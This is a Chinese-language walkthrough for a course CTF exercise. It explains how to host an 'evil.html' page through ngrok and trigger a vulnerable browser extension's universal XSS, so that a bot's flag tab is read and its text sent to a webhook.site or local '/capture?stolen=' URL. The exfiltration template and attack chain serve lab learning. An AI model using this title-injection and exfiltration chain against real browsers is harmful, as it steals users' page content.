# Q2 CTF — “Visit your site” 页面怎么用

## 你在网页上要做什么

1. **左边框 `Your homepage`**  
   填：**公网可访问的 HTTPS 链接**，指向你的 **`evil.html`**。  
   机器人会打开这个 URL。

2. **`Your enquiry`**  
   题目写 “we won’t look at this” — 一般 **不是用来交 flag**；以 Canvas 为准。多数情况 **flag 在外带请求**（webhook）里。

3. **点 `Visit your site!!`**  
   触发机器人（带漏洞扩展 + 另一标签 secret）访问你的主页。

---

## 方案 A：本机托管（你选的）

CTF 机器人在**互联网上**，不能直接访问你电脑的 `http://127.0.0.1/...`。  
所以本机方案 = **本机起静态网站 + 内网穿透**，得到一个 **公网 HTTPS 地址**（下面以 **ngrok** 为例；未安装 cloudflared 可忽略 Cloudflare 小节）。

### A1. 本机起 HTTP 服务（只监听本机）

在 **PowerShell** 里（路径按你实际桌面位置改）：

```powershell
cd "C:\Users\Caiqing\Desktop\HW2\Q2"
python -m http.server 8080
```

保持这个窗口 **不要关**。  
本机自检：浏览器打开 `http://127.0.0.1:8080/evil.html` 应能打开页面。

### A2. 内网穿透 — **ngrok（推荐你当前使用）**

**0. 前提：** 终端 A 里 **`python -m http.server 8080`** 已在 `Q2` 目录跑着，不要关。

**1. 安装 ngrok（Windows）**

- 打开 [https://ngrok.com/download](https://ngrok.com/download)，下载 Windows 版 ZIP。  
- 解压到任意目录，例如 `C:\Tools\ngrok\`。  
- **可选（方便命令行）：** 把该目录加到系统 **PATH**，或在下面命令里写 **`C:\Tools\ngrok\ngrok.exe`** 的完整路径。

**2. 注册并绑定 authtoken**

- 在 [ngrok 控制台](https://dashboard.ngrok.com/) 注册登录，复制 **Your Authtoken**。  
- 在 **新的 PowerShell** 里执行（把 `YOUR_TOKEN` 换成你的 token）：

```powershell
ngrok config add-authtoken YOUR_TOKEN
```

若未加 PATH，用：`C:\Tools\ngrok\ngrok.exe config add-authtoken YOUR_TOKEN`

**3. 把本机 8080 暴露到公网**

```powershell
ngrok http 8080
```

终端或浏览器里打开的 **Web Interface** 会显示 **Forwarding**，例如：

`https://abcd-12-34-56-78.ngrok-free.app -> http://localhost:8080`

**4. 填 CTF 的链接**

- 公网主页（给机器人访问）为：  
  **`https://abcd-12-34-56-78.ngrok-free.app/evil.html`**  
  （域名以你终端里为准，**必须是 https**，后面 **带 `/evil.html`**。）

**查看 ngrok 收到了哪些请求（本机调试）：** 浏览器打开 **`http://127.0.0.1:4040`**（注意是 **4040** 端口，不是 404）。仅在 **`ngrok http 8080` 正在运行** 时才能打开。

**5. 免费 ngrok 的提示页（若机器人一直访问失败可看这条）**

免费域名有时会出现 **ngrok 提示页**（浏览器要点 “Visit Site”）。若 CTF 机器人 **不点按钮**，可能拿不到你的页面。可尝试：

- 换 **静态托管**（GitHub Pages 等）作为 `evil.html` 的 URL；或  
- 使用 ngrok 付费/其它无拦截隧道；或  
- 查 ngrok 文档里关于 **跳过浏览器警告** 的说明（部分场景可用自定义 Header，**取决于机器人是否带该 Header**）。

---

**备选：Cloudflare Tunnel（cloudflared）** — 未安装时会报 `cloudflared` 找不到；若以后要用，从 [Cloudflare 下载页](https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/) 安装后再执行：  
`cloudflared tunnel --url http://127.0.0.1:8080`

### A3. 填 CTF 左边框的 URL

把穿透得到的 **https 根地址** 拼上路径 **`/evil.html`**，例如：

`https://random-words.trycloudflare.com/evil.html`

**整段粘贴**到 **`Your homepage`**。

> 注意：免费隧道 URL **每次重启 cloudflared/ngrok 可能变**，重新提交 CTF 时要改链接。

### A4. 外带地址（`evil.html` 里的 `EXFIL`）

从 **flag 那一页** 发起的 `fetch` 必须打到 **公网 HTTPS**。

**方式 1 — 不用 webhook（与本机 + 单条 ngrok 配套）**

1. **关掉**原来的 `python -m http.server 8080`。  
2. 在 `Q2` 目录运行：

```powershell
cd "C:\Users\Caiqing\Desktop\HW2\Q2"
python serve_and_capture.py
```

3. 它会在 **8080** 上：照常提供 **`/evil.html`**，并多一个 **`/capture?stolen=...`**（把内容打印到终端、追加写入 **`Q2/captured.txt`**，且带 **CORS**，方便跨域 `fetch`）。  
4. `ngrok http 8080` **照旧一条隧道**。  
5. 编辑 **`evil.html`**，把 `EXFIL` 设为（把域名换成你 ngrok 的）：

```text
https://你的子域.ngrok-free.dev/capture?stolen=
```

**方式 2 — webhook.site**

1. 打开 [webhook.site](https://webhook.site)，复制 **HTTPS URL**。  
2. `evil.html` 里：`var EXFIL = "https://webhook.../?stolen=";`（若 URL 已带 `?`，用 `&stolen=`）。

（若坚持「第二个本机端口 + 第二条 ngrok」，免费账号通常只能开一条隧道，一般不推荐。）

---

## 你的主页（`evil.html`）在干什么（原理简述）

漏洞扩展（`universal_xss/extension/background.js`）：

- **第一次**标题更新：只记录，**不**往其它 tab 注入。  
- **第二次**标题变化：对**其它所有 tab** 注入 jQuery + `insert_update.js`。  
- `insert_update.js` 把 `title` 拼进 HTML 再 `prepend` → **XSS 在 flag 所在 tab 执行**。

因此 `evil.html` 先 `document.title = "init-q2"`，再 `setTimeout` 改成 payload，在 flag 页里 `fetch(EXFIL + 页面文本)`。

---

## 浏览器说明

机器人侧是 **Chrome/Chromium + 扩展**。你用 Firefox 只打开 **CTF 提交页** 没问题；**利用链在机器人浏览器里发生**。

---

## 若外带失败，检查什么

- 左边填的必须是 **穿透后的 https + `/evil.html`**，不是裸 `127.0.0.1`。  
- **`evil.html` 已保存**且 `EXFIL` 为 **HTTPS**。  
- `document.title` **长度限制** — payload 过长会失败，可缩短 webhook 路径或使用短域名。  
- webhook 是否出现 **任何** 新请求。

---

## 作业 zip

把最终使用的 **`evil.html`**（及若有本机接收脚本）放在 **`Q2/`**；PDF writeup 写清：**本机端口、穿透工具、最终公网 URL、两步改 title 与源码对应关系、复现步骤**。
